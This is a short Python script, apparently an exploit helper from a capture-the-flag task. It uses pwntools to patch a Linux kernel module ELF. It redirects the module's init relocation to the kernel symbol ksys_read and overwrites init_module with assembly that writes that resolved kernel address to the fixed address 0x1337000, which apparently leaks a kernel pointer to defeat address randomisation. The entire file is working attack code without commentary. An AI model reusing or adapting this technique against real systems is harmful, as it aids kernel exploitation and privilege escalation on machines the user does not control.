from pwnc.minelf import *
from pwn import context, asm
from ctypes import sizeof
import argparse

parser = argparse.ArgumentParser("patch")
parser.add_argument("file")
args = parser.parse_args()

R_X86_64_64 = 1
context.arch = "amd64"

raw_elf_bytes = open(args.file, "rb").read()
elf = ELF(raw_elf_bytes)

symbol_section = elf.section_from_name(b".symtab")
symbols = elf.section_content(symbol_section, elf.Symbol)
symbol_names = elf.section_content(elf.section_from_name(b".strtab"))

this_module_rela_section = elf.section_from_name(b".rela.gnu.linkonce.this_module")
this_module_rela = elf.section_content(this_module_rela_section, elf.Reloca)
init_module = symbols[this_module_rela[0].sym]

init_rela_section = elf.section_from_name(b".rela.init.text")
init_rela = elf.section_content(init_rela_section, elf.Reloca)[0]
init_rela.addend = 0
init_rela.offset = 2
init_rela.type = R_X86_64_64
init_rela.sym = 1
init_rela_section.size = 1 * sizeof(elf.Reloca)
symbols[init_rela.sym].name = 1
symbols[init_rela.sym].info = 0x10
symbols[init_rela.sym].section_index = 0
new_name = b"ksys_read\0"
symbol_names[1:1+len(new_name)] = new_name

init_section = elf.sections[init_module.section_index]
offset = init_section.offset + init_module.value
patch = asm(
"""
    movabs rax, 0
    mov edi, 0x1337000
    mov qword ptr [rdi], rax
    ret
""", vma=offset)
elf.raw_elf_bytes[offset:offset + len(patch)] = patch

for section in elf.sections:
    name = elf.section_name(section).tobytes()
    if name.startswith(b".rela.") and name not in [b".rela.init.text", b".rela.gnu.linkonce.this_module"]:
        section.size = 0

with open("patch.ko", "wb+") as fp:
    fp.write(elf.raw_elf_bytes)